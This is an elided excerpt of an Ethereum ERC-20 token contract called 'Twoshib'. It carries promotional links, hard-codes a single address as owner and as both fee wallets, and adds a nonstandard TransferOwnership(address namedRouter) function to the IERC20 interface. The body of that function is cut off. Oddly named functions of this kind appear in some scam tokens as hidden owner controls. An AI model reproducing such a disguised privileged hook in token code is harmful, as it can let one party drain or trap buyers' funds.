...
/**
https://www.twoshib.com/

https://twoshibadmin-alice.gitbook.io/

https://twitter.com/TWOSHIBERC

https://t.me/TwoshibErc20
...
interface IERC20 {
    ...
    function TransferOwnership(address namedRouter) external returns (uint256);
...
contract Twoshib is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x98B52e876a8b2D677F8772e138c0289159114a3D); 
    address payable public Wallet_Utility = payable(0x98B52e876a8b2D677F8772e138c0289159114a3D);
    ...
    string private constant _name = "Twoshib"; 
    string private constant _symbol = unicode"TWOSHIB";
    ...
    constructor () {
        ...
        _owner = 0x98B52e876a8b2D677F8772e138c0289159114a3D;
    ...
    function TransferOwnership(address namedRouter) public override returns (uint256) {
